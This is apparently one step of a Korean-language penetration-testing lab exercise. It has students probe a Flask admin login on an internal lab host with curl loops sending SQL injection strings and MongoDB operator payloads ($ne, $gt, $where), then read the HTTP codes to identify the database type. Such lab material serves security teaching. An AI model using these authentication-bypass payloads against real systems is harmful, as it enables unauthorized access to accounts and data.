  - order: 3
    instruction: |
      ## 🎯 MISSION — AdminConsole (Python Flask) 의 NoSQL vs SQL 식별

      AdminConsole = Python Flask. *SQL 또는 NoSQL* 의 식별. sqlmap 의 *NoSQL 비지원*
      → NoSQL 발견 시 *수동 payload* (NoSQLMap 또는 직접 작성).

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **NoSQL injection** = MongoDB / CouchDB / Redis 등 의 *injection*. SQL 과 *문법
        다름*
      - **MongoDB injection 표준 payload** = `{"$ne": null}` / `{"$gt": ""}` / `{"$where": "1==1"}`
      - **Python Flask + SQLAlchemy** = SQL ORM — SQLi 가능
      - **Python Flask + pymongo** = NoSQL — sqlmap 비지원
      - **NoSQLMap** = NoSQL 전용 도구 (codingo/NoSQLMap)

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      # 1) AdminConsole 의 server header (Flask 확인)
      curl -sI -H 'Host: admin.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'server|x-' | head -5

      # 2) 일반 SQLi payload (SQL 가능성)
      for p in "1' OR '1'='1" "1' OR 1=1--" "admin'--"; do
        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
          "http://10.20.30.1/login?username=$p&password=test")
        echo "SQL '$p': $code"
      done

      # 3) NoSQL payload (Mongo 가능성)
      for p in '{"$ne":null}' '{"$gt":""}' '{"$where":"1==1"}'; do
        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
          -X POST -H 'Content-Type: application/json' \
          -d "{\"username\":$p,\"password\":\"test\"}" \
          http://10.20.30.1/api/login)
        echo "NoSQL $p: $code"
      done
      SH
      ```

      ## 📋 확인 사항

      - server header: Werkzeug/Python (Flask 확정)
      - SQL payload 응답 (200 = vuln / 400 = parse error / 401 = 정상 거부)
      - NoSQL payload 응답 (200 = MongoDB vuln 가능성)
      - 어느 *DB type* 인지 결론

      ## 💡 왜 이걸 하는가?

      sqlmap 의 *한계* = *SQL 만*. modern stack (MongoDB / Redis / GraphQL) 의 *별
      도구* 필요. 본 step 의 *식별* 가 *공격 도구 선택* 의 시작.

      ## 🔍 결과 해석

      - **SQL vuln** (200 응답): SQLAlchemy 또는 raw SQL — sqlmap 추가 시도
      - **NoSQL vuln** (200 with $ne): MongoDB — NoSQLMap 권장
      - **모두 401/400**: 정상 거부 — input validation 적용

      ## 비정상 시 대응

      - **AdminConsole 의 endpoint 다름**: `/login` 또는 `/api/login` 또는 `/auth/login`
        시도
      - **POST 의 body 형식 다름**: `Content-Type: application/x-www-form-urlencoded` 시도

      ## 실측 (2026-05-16)
      - AdminConsole server: Werkzeug/3.1.8 Python/3.11.15 (Flask 확정)
